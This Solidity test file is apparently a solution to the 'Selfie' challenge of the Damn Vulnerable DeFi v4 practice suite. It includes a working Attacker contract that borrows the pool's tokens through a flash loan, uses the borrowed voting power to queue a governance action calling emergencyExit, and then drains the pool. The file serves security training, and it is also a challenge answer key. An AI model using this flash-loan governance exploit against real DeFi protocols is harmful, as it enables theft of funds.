// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */

    /**
     * POC: the pool and governance contracts are using the same token address.
     *  So we can loan a huge amount of tokens to be able to vote, then queue the emergencyExit() call
     *  and finally execute it.
     */
    function test_selfie() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(address(pool), recovery, address(token), address(governance));
        bytes memory data = abi.encodeCall(pool.emergencyExit, (recovery));
        attacker.attack(data);
        vm.warp(block.timestamp + governance.getActionDelay() + 1);
        attacker.executeAction();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attacker {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    SelfiePool internal _pool;
    DamnValuableVotes internal _token;
    address internal _recovery;
    uint256 internal _actionId;
    SimpleGovernance internal _governance;

    constructor(address pool, address recovery, address token, address governance) {
        _pool = SelfiePool(pool);
        _token = DamnValuableVotes(token);
        _recovery = recovery;
        _governance = SimpleGovernance(governance);
    }

    function attack(bytes memory data) external {
        _pool.flashLoan(IERC3156FlashBorrower(address(this)), address(_token), _token.balanceOf(address(_pool)), data);
    }

    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        _token.delegate(address(this));
        _actionId = _governance.queueAction(address(_pool), 0, data);
        uint256 payment = amount + fee;
        _token.approve(address(_pool), payment);

        return CALLBACK_SUCCESS;
    }

    function executeAction() external {
        _governance.executeAction(_actionId);
    }
}
